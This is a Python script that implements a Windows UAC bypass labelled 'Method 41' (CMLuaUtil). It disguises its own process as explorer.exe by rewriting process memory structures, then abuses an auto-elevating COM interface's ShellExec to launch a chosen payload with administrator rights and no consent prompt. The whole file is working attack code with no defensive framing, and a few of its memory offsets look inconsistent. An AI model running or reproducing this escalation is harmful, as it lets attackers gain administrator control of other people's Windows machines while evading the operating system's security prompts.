import sys
import os
import ctypes
from ctypes import wintypes, windll, byref, POINTER, c_void_p, c_long, sizeof, cast, create_unicode_buffer, memmove, addressof, memset, string_at, Structure, Union, c_bool, c_int, c_wchar_p, Array, c_byte
import struct
import subprocess
import traceback
CLSCTX_INPROC_SERVER = 1
CLSCTX_INPROC_HANDLER = 2
CLSCTX_LOCAL_SERVER = 4
COINIT_APARTMENTTHREADED = 2
COINIT_MULTITHREADED = 0
S_OK = 0
SEE_MASK_DEFAULT = 0
SW_SHOW = 5
SW_HIDE = 0
CLSID_CMSTPLUA = '{3E5FC7F9-9A51-4367-9063-A120244FBEC7}'
IID_ICMLUAUTIL = '{6EDD6D74-C007-4E75-B76A-E5740995E24C}'
ole32 = ctypes.windll.ole32
kernel32 = ctypes.windll.kernel32
ntdll = ctypes.windll.ntdll
advapi32 = ctypes.windll.advapi32
PVOID = ctypes.c_void_p
HANDLE = wintypes.HANDLE
DWORD = wintypes.DWORD
ULONG = wintypes.ULONG
BOOL = wintypes.BOOL
HRESULT = LONG = ctypes.c_long
LPARAM = ctypes.c_long
UINT = ctypes.c_uint
class GUID(ctypes.Structure):
    _fields_ = [('Data1', ctypes.c_ulong), ('Data2', ctypes.c_ushort), ('Data3', ctypes.c_ushort), ('Data4', (ctypes.c_ubyte * 8))]
class BIND_OPTS3(ctypes.Structure):
    _fields_ = [('cbStruct', DWORD), ('grFlags', DWORD), ('grfMode', DWORD), ('dwTickCount', DWORD), ('dwTrackFlags', DWORD), ('dwClassContext', DWORD), ('locale', DWORD), ('pServerInfo', ctypes.c_void_p), ('hwnd', ctypes.c_void_p)]
class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [('hProcess', HANDLE), ('hThread', HANDLE), ('dwProcessId', DWORD), ('dwThreadId', DWORD)]
class STARTUPINFOW(ctypes.Structure):
    _fields_ = [('cb', DWORD), ('lpReserved', wintypes.LPWSTR), ('lpDesktop', wintypes.LPWSTR), ('lpTitle', wintypes.LPWSTR), ('dwX', DWORD), ('dwY', DWORD), ('dwXSize', DWORD), ('dwYSize', DWORD), ('dwXCountChars', DWORD), ('dwYCountChars', DWORD), ('dwFillAttribute', DWORD), ('dwFlags', DWORD), ('wShowWindow', wintypes.WORD), ('cbReserved2', wintypes.WORD), ('lpReserved2', ctypes.c_void_p), ('hStdInput', HANDLE), ('hStdOutput', HANDLE), ('hStdError', HANDLE)]
class STARTUPINFOEXW(ctypes.Structure):
    _fields_ = [('StartupInfo', STARTUPINFOW), ('lpAttributeList', ctypes.c_void_p)]
class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [('nLength', DWORD), ('lpSecurityDescriptor', ctypes.c_void_p), ('bInheritHandle', BOOL)]
class CREATE_PROCESS_DEBUG_INFO(ctypes.Structure):
    _fields_ = [('hFile', HANDLE), ('hProcess', HANDLE), ('hThread', HANDLE), ('lpBaseOfImage', ctypes.c_void_p), ('dwDebugInfoFileOffset', DWORD), ('nDebugInfoSize', DWORD), ('lpThreadStartAddress', ctypes.c_void_p), ('lpImageName', ctypes.c_void_p), ('fUnicode', wintypes.WORD)]
class DEBUG_EVENT(ctypes.Structure):
    _fields_ = [('dwDebugEventCode', DWORD), ('dwProcessId', DWORD), ('dwThreadId', DWORD), ('dwBytesReserved', DWORD)]
class ICMLuaUtilVtbl(ctypes.Structure):
    _fields_ = [('QueryInterface', ctypes.c_void_p), ('AddRef', ctypes.c_void_p), ('Release', ctypes.c_void_p), ('SetRasCredentials', ctypes.c_void_p), ('SetRasEntryProperties', ctypes.c_void_p), ('DeleteRasEntry', ctypes.c_void_p), ('LaunchInfSection', ctypes.c_void_p), ('LaunchInfSectionEx', ctypes.c_void_p), ('CreateLayerDirectory', ctypes.c_void_p), ('ShellExec', ctypes.c_void_p)]
class ICMLuaUtil(ctypes.Structure):
    _fields_ = [('lpVtbl', ctypes.POINTER(ICMLuaUtilVtbl))]
kernel32.CreateProcessW.argtypes = [wintypes.LPCWSTR, wintypes.LPWSTR, ctypes.POINTER(SECURITY_ATTRIBUTES), ctypes.POINTER(SECURITY_ATTRIBUTES), BOOL, DWORD, ctypes.c_void_p, wintypes.LPCWSTR, ctypes.c_void_p, ctypes.POINTER(PROCESS_INFORMATION)]
kernel32.CreateProcessW.restype = BOOL
kernel32.WaitForDebugEvent.argtypes = [ctypes.c_void_p, DWORD]
kernel32.WaitForDebugEvent.restype = BOOL
kernel32.ContinueDebugEvent.argtypes = [DWORD, DWORD, DWORD]
kernel32.ContinueDebugEvent.restype = BOOL
kernel32.TerminateProcess.argtypes = [HANDLE, UINT]
kernel32.TerminateProcess.restype = BOOL
kernel32.CloseHandle.argtypes = [HANDLE]
kernel32.CloseHandle.restype = BOOL
kernel32.InitializeProcThreadAttributeList.argtypes = [ctypes.c_void_p, DWORD, DWORD, ctypes.POINTER(ctypes.c_size_t)]
kernel32.InitializeProcThreadAttributeList.restype = BOOL
kernel32.UpdateProcThreadAttribute.argtypes = [ctypes.c_void_p, DWORD, DWORD, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p]
kernel32.UpdateProcThreadAttribute.restype = BOOL
kernel32.DeleteProcThreadAttributeList.argtypes = [ctypes.c_void_p]
kernel32.DeleteProcThreadAttributeList.restype = None
ntdll.NtQueryInformationProcess.argtypes = [HANDLE, DWORD, ctypes.c_void_p, ULONG, ctypes.POINTER(ULONG)]
ntdll.NtQueryInformationProcess.restype = LONG
ntdll.NtDuplicateObject.argtypes = [HANDLE, HANDLE, HANDLE, ctypes.POINTER(HANDLE), ULONG, ULONG, ULONG]
ntdll.NtDuplicateObject.restype = LONG
ntdll.NtRemoveProcessDebug.argtypes = [HANDLE, HANDLE]
ntdll.NtRemoveProcessDebug.restype = LONG
ntdll.NtClose.argtypes = [HANDLE]
ntdll.NtClose.restype = LONG
try:
    ntdll.DbgUiSetThreadDebugObject.argtypes = [HANDLE]
    ntdll.DbgUiSetThreadDebugObject.restype = LONG
except AttributeError:
    pass
_masq_explorer_path_w = None
_masq_explorer_cmd_w = None
_masq_explorer_base_w = None
_masq_explorer_full_w = None
def get_windows_directory():
    buf = ctypes.create_unicode_buffer(260)
    kernel32.GetWindowsDirectoryW(buf, 260)
    val = buf.value
    if (not val.endswith('\\')):
        val += '\\'
    return val
def cmluautil_method(executable):
    global log
    if log:
        print('[*] Method 41: CMLuaUtil')
    if log:
        print('[*] Initializing COM...')
    hr = ole32.CoInitializeEx(None, COINIT_APARTMENTTHREADED)
    if ((hr != S_OK) and (hr != 1)):
        if log:
            print(f'[-] CoInitializeEx failed: 0x{hr:08X}')
    if log:
        print('[*] Calling supMasqueradeProcess...')
    if (not supMasqueradeProcess()):
        if log:
            print('[-] Masquerade failed, trying anyway...')
    moniker = f'Elevation:Administrator!new:{CLSID_CMSTPLUA}'
    bind_opts = BIND_OPTS3()
    bind_opts.cbStruct = ctypes.sizeof(BIND_OPTS3)
    bind_opts.dwClassContext = CLSCTX_LOCAL_SERVER
    moniker_w = ctypes.create_unicode_buffer(moniker)
    clsid_bin = GUID()
    hr = ole32.CLSIDFromString(CLSID_CMSTPLUA, ctypes.byref(clsid_bin))
    if (hr == S_OK):
        if log:
            print(f'[*] CLSIDFromString succeeded')
    elif log:
        print(f'[-] CLSIDFromString failed: 0x{hr:08X}')
    def parse_guid(guid_str):
        guid_str = guid_str.strip('{}')
        parts = guid_str.split('-')
        data1 = int(parts[0], 16)
        data2 = int(parts[1], 16)
        data3 = int(parts[2], 16)
        data4 = []
        for i in range(3, len(parts)):
            part = parts[i]
            for j in range(0, len(part), 2):
                data4.append(int(part[j:(j + 2)], 16))
        while (len(data4) < 8):
            data4.append(0)
        data4 = data4[:8]
        if log:
            print(f'[*] Parsed GUID: {data1:08X}-{data2:04X}-{data3:04X}-{data4[0]:02X}{data4[1]:02X}-{data4[2]:02X}{data4[3]:02X}{data4[4]:02X}{data4[5]:02X}{data4[6]:02X}{data4[7]:02X}')
        return GUID(data1, data2, data3, (ctypes.c_ubyte * 8)(*data4))
    iid = parse_guid(IID_ICMLUAUTIL)
    if log:
        print('[*] Calling CoGetObject with elevation moniker...')
    p_unk = ctypes.c_void_p()
    hr = ole32.CoGetObject(moniker_w, ctypes.byref(bind_opts), ctypes.byref(iid), ctypes.byref(p_unk))
    if log:
        print(f'[*] CoGetObject returned: 0x{hr:08X} ({hr})')
    error_names = {2147942405: 'E_ACCESSDENIED', 2147942526: 'CO_E_APPNOTFOUND', 2147943623: 'RPC_E_CHANGED_MODE', 2147549465: 'RPC_S_CALL_FAILED', 2147549469: 'CO_E_APPDIDNTREG', (- 2146959337): 'CO_E_APPNOTFOUND'}
    if (hr in error_names):
        if log:
            print(f'[*] Known error: {error_names[hr]}')
        if log:
            print('[*] Trying CoCreateInstance instead...')
        if (hr == S_OK):
            clsid = clsid_bin
            if log:
                print(f'[*] Using CLSIDFromString result')
        else:
            clsid = parse_guid(CLSID_CMSTPLUA)
        iid = parse_guid(IID_ICMLUAUTIL)
        p_cmluautil = ctypes.c_void_p()
        clsctx = ((CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER) | CLSCTX_INPROC_HANDLER)
        if log:
            print(f'[*] Trying CoCreateInstance with CLSCTX_LOCAL_SERVER|INPROC_SERVER|INPROC_HANDLER...')
        hr = ole32.CoCreateInstance(ctypes.byref(clsid), None, clsctx, ctypes.byref(iid), ctypes.byref(p_cmluautil))
        if log:
            print(f'[*] CoCreateInstance returned: 0x{hr:08X}')
        if (hr != S_OK):
            if log:
                print(f'[-] CoCreateInstance failed: 0x{hr:08X}')
            ole32.CoUninitialize()
            return 1
        p_unk = ctypes.cast(p_cmluautil, ctypes.c_void_p)
    elif (hr != S_OK):
        if log:
            print(f'[-] CoGetObject failed: 0x{hr:08X}')
        ole32.CoUninitialize()
        return 1
    if log:
        print('[*] Got interface, casting to ICMLuaUtil...')
    p_cmluautil = ctypes.cast(p_unk, ctypes.POINTER(ICMLuaUtil))
    if (not p_cmluautil):
        if log:
            print('[-] Failed to get ICMLuaUtil interface')
        ole32.CoUninitialize()
        return 1
    if log:
        print('[*] Calling ShellExec...')
    oleaut32 = ctypes.windll.oleaut32
    oleaut32.SysAllocString.argtypes = [ctypes.c_wchar_p]
    oleaut32.SysAllocString.restype = ctypes.c_void_p
    oleaut32.SysFreeString.argtypes = [ctypes.c_void_p]
    bstr_file = oleaut32.SysAllocString(executable)
    shell_exec_ptr = p_cmluautil.contents.lpVtbl.contents.ShellExec
    shell_exec = ctypes.WINFUNCTYPE(HRESULT, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, DWORD, DWORD)(shell_exec_ptr)
    hr = shell_exec(p_cmluautil, bstr_file, None, None, SEE_MASK_DEFAULT, SW_SHOW)
    oleaut32.SysFreeString(bstr_file)
    if (hr >= 0):
        if log:
            print(f'[+] Method 41 (CMLuaUtil): Success')
        release_ptr = p_cmluautil.contents.lpVtbl.contents.Release
        release = ctypes.CFUNCTYPE(ULONG, ctypes.c_void_p)(release_ptr)
        release(p_cmluautil)
        ole32.CoUninitialize()
        return 0
    else:
        if log:
            print(f'[-] Method 41 (CMLuaUtil): ShellExec failed: 0x{hr:08X}')
        ole32.CoUninitialize()
        return 1
def supMasqueradeProcess():
    global log, _masq_explorer_path_w, _masq_explorer_cmd_w, _masq_explorer_base_w, _masq_explorer_full_w
    if log:
        print('[*] Running supMasqueradeProcess...')
    kernel32.ReadProcessMemory.argtypes = [HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    kernel32.ReadProcessMemory.restype = BOOL
    kernel32.WriteProcessMemory.argtypes = [HANDLE, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
    kernel32.WriteProcessMemory.restype = BOOL
    try:
        hProcess = kernel32.GetCurrentProcess()
        class PROCESS_BASIC_INFORMATION(ctypes.Structure):
            _fields_ = [('ExitStatus', ctypes.c_long), ('PebBaseAddress', ctypes.c_void_p), ('AffinityMask', ctypes.c_size_t), ('BasePriority', ctypes.c_long), ('UniqueProcessId', ctypes.c_size_t), ('InheritedFromUniqueProcessId', ctypes.c_size_t)]
        pbi = PROCESS_BASIC_INFORMATION()
        ret_len = ctypes.c_ulong()
        status = ntdll.NtQueryInformationProcess(hProcess, 0, ctypes.byref(pbi), ctypes.sizeof(pbi), ctypes.byref(ret_len))
        if (status < 0):
            if log:
                print(f'[-] NtQueryInformationProcess failed: 0x{status:08X}')
            return False
        peb_addr = pbi.PebBaseAddress
        if (not peb_addr):
            if log:
                print('[-] Could not get PEB address')
            return False
        if log:
            print(f'[+] PEB address: {peb_addr:#x}')
        process_params_addr_buf = ctypes.c_void_p()
        bytes_read = ctypes.c_size_t()
        result = kernel32.ReadProcessMemory(hProcess, ctypes.c_void_p((peb_addr + 32)), ctypes.byref(process_params_addr_buf), ctypes.sizeof(ctypes.c_void_p), ctypes.byref(bytes_read))
        if (not result):
            if log:
                print(f'[-] ReadProcessMemory for ProcessParameters failed: {kernel32.GetLastError()}')
            return False
        process_params_addr = process_params_addr_buf.value
        if (not process_params_addr):
            if log:
                print('[-] ProcessParameters is NULL')
            return False
        if log:
            print(f'[+] ProcessParameters address: {process_params_addr:#x}')
        class UNICODE_STRING(ctypes.Structure):
            _fields_ = [('Length', ctypes.c_ushort), ('MaximumLength', ctypes.c_ushort), ('Buffer', ctypes.c_void_p)]
        image_path_str = UNICODE_STRING()
        result = kernel32.ReadProcessMemory(hProcess, ctypes.c_void_p((process_params_addr + 96)), ctypes.byref(image_path_str), ctypes.sizeof(UNICODE_STRING), ctypes.byref(bytes_read))
        if (not result):
            if log:
                print(f'[-] ReadProcessMemory for ImagePathName failed')
            return False
        if log:
            print(f'[+] Original ImagePathName: Buffer={image_path_str.Buffer:#x}, Length={image_path_str.Length}')
        cmd_line_offsets = [112]
        cmd_line_str = None
        cmd_line_offset = 112
        for offset in cmd_line_offsets:
            test_cmd_line = UNICODE_STRING()
            result = kernel32.ReadProcessMemory(hProcess, ctypes.c_void_p((process_params_addr + offset)), ctypes.byref(test_cmd_line), ctypes.sizeof(UNICODE_STRING), ctypes.byref(bytes_read))
            if (result and test_cmd_line.Buffer):
                cmd_line_str = test_cmd_line
                cmd_line_offset = offset
                if log:
                    print(f'[+] Original CommandLine (offset 0x{offset:x}): Buffer={cmd_line_str.Buffer:#x}, Length={cmd_line_str.Length}')
                break
        if (cmd_line_str is None):
            if log:
                print('[-] Could not read CommandLine, proceeding anyway')
            cmd_line_offset = 72
        win_dir = get_windows_directory()
        explorer_path = (win_dir + 'explorer.exe')
        _masq_explorer_path_w = ctypes.create_unicode_buffer(explorer_path)
        explorer_path_w = _masq_explorer_path_w
        new_image_path = UNICODE_STRING()
        new_image_path.Length = (len(explorer_path) * 2)
        new_image_path.MaximumLength = ((len(explorer_path) + 1) * 2)
        new_image_path.Buffer = ctypes.addressof(explorer_path_w)
        result = kernel32.WriteProcessMemory(hProcess, ctypes.c_void_p((process_params_addr + 96)), ctypes.byref(new_image_path), ctypes.sizeof(UNICODE_STRING), ctypes.byref(bytes_read))
        if (not result):
            if log:
                print(f'[-] WriteProcessMemory for ImagePathName failed: {kernel32.GetLastError()}')
            return False
        verify_image = UNICODE_STRING()
        kernel32.ReadProcessMemory(hProcess, ctypes.c_void_p((process_params_addr + 56)), ctypes.byref(verify_image), ctypes.sizeof(UNICODE_STRING), ctypes.byref(bytes_read))
        if log:
            print(f'[+] Verified ImagePathName: Buffer={verify_image.Buffer:#x}, Length={verify_image.Length}')
        _masq_explorer_cmd_w = ctypes.create_unicode_buffer('explorer.exe')
        explorer_cmd = _masq_explorer_cmd_w
        new_cmd_line = UNICODE_STRING()
        new_cmd_line.Length = (len('explorer.exe') * 2)
        new_cmd_line.MaximumLength = ((len('explorer.exe') + 1) * 2)
        new_cmd_line.Buffer = ctypes.addressof(explorer_cmd)
        result = kernel32.WriteProcessMemory(hProcess, ctypes.c_void_p((process_params_addr + cmd_line_offset)), ctypes.byref(new_cmd_line), ctypes.sizeof(UNICODE_STRING), ctypes.byref(bytes_read))
        if (not result):
            if log:
                print(f'[-] WriteProcessMemory for CommandLine failed: {kernel32.GetLastError()}')
            return False
        if log:
            print('[+] supMasqueradeProcess SUCCESS - PEB modified to explorer.exe')
        if log:
            print('[*] Modifying module list...')
        ldr_addr_buf = ctypes.c_void_p()
        result = kernel32.ReadProcessMemory(hProcess, ctypes.c_void_p((peb_addr + 24)), ctypes.byref(ldr_addr_buf), ctypes.sizeof(ctypes.c_void_p), ctypes.byref(bytes_read))
        if (result and ldr_addr_buf.value):
            ldr_addr = ldr_addr_buf.value
            if log:
                print(f'[+] LDR address: {ldr_addr:#x}')
            first_module_ptr = ctypes.c_void_p()
            kernel32.ReadProcessMemory(hProcess, ctypes.c_void_p((ldr_addr + 16)), ctypes.byref(first_module_ptr), ctypes.sizeof(ctypes.c_void_p), ctypes.byref(bytes_read))
            if first_module_ptr.value:
                first_entry = first_module_ptr.value
                if log:
                    print(f'[+] First module entry: {first_entry:#x}')
                base_dll_name = UNICODE_STRING()
                kernel32.ReadProcessMemory(hProcess, ctypes.c_void_p((first_entry + 88)), ctypes.byref(base_dll_name), ctypes.sizeof(UNICODE_STRING), ctypes.byref(bytes_read))
                if (base_dll_name.Buffer and (base_dll_name.Length > 0)):
                    dll_name_buf = ctypes.create_unicode_buffer(((base_dll_name.Length // 2) + 1))
                    kernel32.ReadProcessMemory(hProcess, base_dll_name.Buffer, dll_name_buf, base_dll_name.Length, ctypes.byref(bytes_read))
                    if log:
                        print(f'[+] Current module BaseDllName: {dll_name_buf.value}')
                    current_exe_name = sys.executable.split('\\')[(- 1)].lower()
                    if ((current_exe_name in dll_name_buf.value.lower()) or ('python' in dll_name_buf.value.lower())):
                        if log:
                            print(f'[*] Modifying module name to explorer.exe...')
                        _masq_explorer_base_w = ctypes.create_unicode_buffer('explorer.exe')
                        new_base = UNICODE_STRING()
                        new_base.Length = (len('explorer.exe') * 2)
                        new_base.MaximumLength = ((len('explorer.exe') * 2) + 2)
                        new_base.Buffer = ctypes.addressof(_masq_explorer_base_w)
                        kernel32.WriteProcessMemory(hProcess, ctypes.c_void_p((first_entry + 88)), ctypes.byref(new_base), ctypes.sizeof(UNICODE_STRING), ctypes.byref(bytes_read))
                        _masq_explorer_full_w = ctypes.create_unicode_buffer(explorer_path)
                        new_full = UNICODE_STRING()
                        new_full.Length = (len(explorer_path) * 2)
                        new_full.MaximumLength = ((len(explorer_path) * 2) + 2)
                        new_full.Buffer = ctypes.addressof(_masq_explorer_full_w)
                        kernel32.WriteProcessMemory(hProcess, ctypes.c_void_p((first_entry + 72)), ctypes.byref(new_full), ctypes.sizeof(UNICODE_STRING), ctypes.byref(bytes_read))
                        if log:
                            print('[+] Module name modified')
        return True
    except Exception as e:
        if log:
            print(f'[-] supMasqueradeProcess exception: {e}')
        traceback.print_exc()
        return False
def method41(payload):
    global log
    log = False
    return cmluautil_method(payload)
if (__name__ == '__main__'):
    print(f'[*] Method: 41, Payload: python.exe')
    method41("python.exe")